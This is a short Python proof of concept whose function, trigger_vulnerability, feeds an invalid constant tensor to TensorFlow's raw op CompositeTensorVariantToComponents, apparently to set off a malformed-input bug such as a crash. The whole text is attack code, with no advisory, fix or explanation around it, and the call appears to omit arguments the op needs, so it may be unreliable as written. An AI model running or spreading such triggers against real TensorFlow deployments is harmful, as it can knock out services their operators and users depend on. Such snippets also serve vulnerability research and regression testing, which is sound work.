import tensorflow as tf

def trigger_vulnerability(encoded):
    return tf.raw_ops.CompositeTensorVariantToComponents(encoded)

invalid_encoded = tf.constant([1, 2, 3])
components = trigger_vulnerability(invalid_encoded)